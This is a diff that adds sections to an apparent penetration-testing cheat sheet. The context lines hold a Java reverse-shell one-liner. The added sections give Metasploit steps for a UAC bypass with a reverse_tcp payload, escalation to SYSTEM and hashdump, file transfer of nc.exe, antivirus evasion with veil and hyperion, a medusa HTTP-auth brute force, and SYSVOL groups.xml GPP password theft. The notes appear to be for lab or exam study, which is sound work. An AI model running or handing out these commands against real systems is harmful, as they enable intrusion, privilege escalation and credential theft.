@@ -60,6 +60,13 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
+# generic file transfers
+```
+# if you have meterpreter shell, you can upload/download files using it
+meterpreter> upload /usr/share/windows-binaries/nc.exe c:\\nc.exe
+meterpreter> download  c:\\nc.exe /usr/share/windows-binaries/nc.exe
+```
+
 # windows file transfers
 
 ```
@@ -418,4 +425,50 @@ veil / hyperion
 ```
 # flip random bytes (magic bytes)
 ```
+
+# bypass uac
+```
+meterpreter> background
+msf> use windows/local/bypssuac
+msf> set SESSION 1
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> set LHOST
+msf> set LPORT 
+msf> run
+...
+meterpreter> getprivs
+meterpreter> ps
+meterpreter> migrate (process with SYSTEM)
+meterpreter> hashdump
+```
+
+# avoiding avs
+```
+# encoding does like nothing, but you can embed shellcode into PE that is not malicious
+# use hyperion
+# use veil
+```
+
+# crack basic http auth with medusa
+```
+medusa -h admin.megacorpone.com -u admin -P mega-mangled -M http -n 81 -m DIR:/admin -T 30
+```
+
+# check what type of hash is that
+```
+hash-identifier
+```
+
+# post exploitation in domain
+```
+meterpreter> background
+msf> use post/windows/gather/enum_domain
+msf> set SESSION 1
+...found DC & IP...
+msf> sessions -i 1
+meterpreter> shell
+shell> net use z: \\dc01\SYSVOL
+shell> dir /s groups.xml
+shell> cp . Downloads
+# decrypt passsword with gpp-decrypyt PASSWORD
 
